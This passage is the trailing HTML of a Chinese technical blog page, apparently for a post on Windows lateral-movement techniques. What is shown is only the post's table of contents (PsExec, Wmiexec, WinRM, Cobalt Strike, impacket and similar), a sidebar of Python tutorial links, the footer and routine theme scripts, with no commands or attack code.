class="toc-text">命令使用条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.2.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%88%A9%E7%94%A8wmic"><span class="toc-number">3.4.3.</span> <span class="toc-text">msf利用wmic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM"><span class="toc-number">3.5.</span> <span class="toc-text">WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM%E7%AE%80%E4%BB%8B"><span class="toc-number">3.5.1.</span> <span class="toc-text">WinRM简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFWinRM"><span class="toc-number">3.5.2.</span> <span class="toc-text">开启WinRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Winrs%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.5.3.</span> <span class="toc-text">Winrs执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.5.4.</span> <span class="toc-text">WinRM横向移动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E5%A4%96%E9%83%A8%E5%B7%A5%E5%85%B7%E7%AF%87"><span class="toc-number">4.</span> <span class="toc-text">横向移动-外部工具篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Smbexec%E3%80%81Psexec"><span class="toc-number">4.1.</span> <span class="toc-text">Smbexec、Psexec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec%E7%AE%80%E4%BB%8B"><span class="toc-number">4.1.1.</span> <span class="toc-text">Psexec简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.2.</span> <span class="toc-text">Psexec原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec%E4%BD%BF%E7%94%A8%E5%89%8D%E6%8F%90"><span class="toc-number">4.1.3.</span> <span class="toc-text">Psexec使用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PsExec-exe%E4%BD%BF%E7%94%A8"><span class="toc-number">4.1.4.</span> <span class="toc-text">PsExec.exe使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec-py"><span class="toc-number">4.1.5.</span> <span class="toc-text">Psexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smbexec-py"><span class="toc-number">4.1.6.</span> <span class="toc-text">Smbexec.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wmiexec"><span class="toc-number">4.2.</span> <span class="toc-text">Wmiexec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wmiexec-vbs"><span class="toc-number">4.2.1.</span> <span class="toc-text">Wmiexec.vbs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI-HACKER"><span class="toc-number">4.2.2.</span> <span class="toc-text">WMI-HACKER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmicmd-exe"><span class="toc-number">4.2.3.</span> <span class="toc-text">wmicmd.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wmiexec-py"><span class="toc-number">4.2.4.</span> <span class="toc-text">Wmiexec.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pth-winexe"><span class="toc-number">4.3.</span> <span class="toc-text">pth-winexe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit"><span class="toc-number">4.4.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec"><span class="toc-number">4.4.1.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%AA%83%E5%8F%96"><span class="toc-number">4.4.2.</span> <span class="toc-text">Token窃取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobaltstrike"><span class="toc-number">4.5.</span> <span class="toc-text">Cobaltstrike</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96"><span class="toc-number">4.5.1.</span> <span class="toc-text">凭证获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">4.5.2.</span> <span class="toc-text">扫描存活主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec-1"><span class="toc-number">4.5.3.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec-psh"><span class="toc-number">4.5.4.</span> <span class="toc-text">Psexec_psh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM-1"><span class="toc-number">4.5.5.</span> <span class="toc-text">WinRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%AA%83%E5%8F%96-1"><span class="toc-number">4.5.6.</span> <span class="toc-text">Token窃取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SharpRDP"><span class="toc-number">4.6.</span> <span class="toc-text">SharpRDP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.6.1.</span> <span class="toc-text">原理详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.6.2.</span> <span class="toc-text">使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%88%E6%9E%9C"><span class="toc-number">4.6.3.</span> <span class="toc-text">使用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impacket%E5%A5%97%E4%BB%B6"><span class="toc-number">4.7.</span> <span class="toc-text">impacket套件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">其他问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/7.%20%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html" title="7. 深入面向对象"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237553.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="7. 深入面向对象"/></a><div class="content"><a class="title" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/7.%20%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html" title="7. 深入面向对象">7. 深入面向对象</a><time datetime="2022-11-04T10:43:50.312Z" title="更新于 2022-11-04 18:43:50">2022-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/6.%20%E5%88%9D%E8%AF%86%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1.html" title="6. 初识面相对象"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237571.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="6. 初识面相对象"/></a><div class="content"><a class="title" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/6.%20%E5%88%9D%E8%AF%86%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1.html" title="6. 初识面相对象">6. 初识面相对象</a><time datetime="2022-11-04T06:06:07.914Z" title="更新于 2022-11-04 14:06:07">2022-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/5.%20%E5%87%BD%E6%95%B0%E8%BF%9B%E9%98%B6.html" title="5. 函数进阶"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237497.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="5. 函数进阶"/></a><div class="content"><a class="title" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/5.%20%E5%87%BD%E6%95%B0%E8%BF%9B%E9%98%B6.html" title="5. 函数进阶">5. 函数进阶</a><time datetime="2022-11-03T15:25:19.879Z" title="更新于 2022-11-03 23:25:19">2022-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/9.%20%E4%B8%89%E5%99%A8%E4%B8%80%E9%97%AD.html" title="9. 三器一闭"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237556.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="9. 三器一闭"/></a><div class="content"><a class="title" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/9.%20%E4%B8%89%E5%99%A8%E4%B8%80%E9%97%AD.html" title="9. 三器一闭">9. 三器一闭</a><time datetime="2022-11-03T08:46:20.012Z" title="更新于 2022-11-03 16:46:20">2022-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/8.%20%E8%BF%9B%E9%98%B6%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html" title="8. 进阶面向对象"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237483.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="8. 进阶面向对象"/></a><div class="content"><a class="title" href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/8.%20%E8%BF%9B%E9%98%B6%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html" title="8. 进阶面向对象">8. 进阶面向对象</a><time datetime="2022-11-03T08:46:20.012Z" title="更新于 2022-11-03 16:46:20">2022-11-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 晚上十一点睡觉</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to 11pmsleep's blog ~~~ 该网站用来记录学习笔记及生活，欢迎交流技术~~~Blog仅供个人记录笔记学习所用，若有侵权，联系我删除~若有错误，也望诸君不吝指正</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikoo.gungnir.top/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.gungnir.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>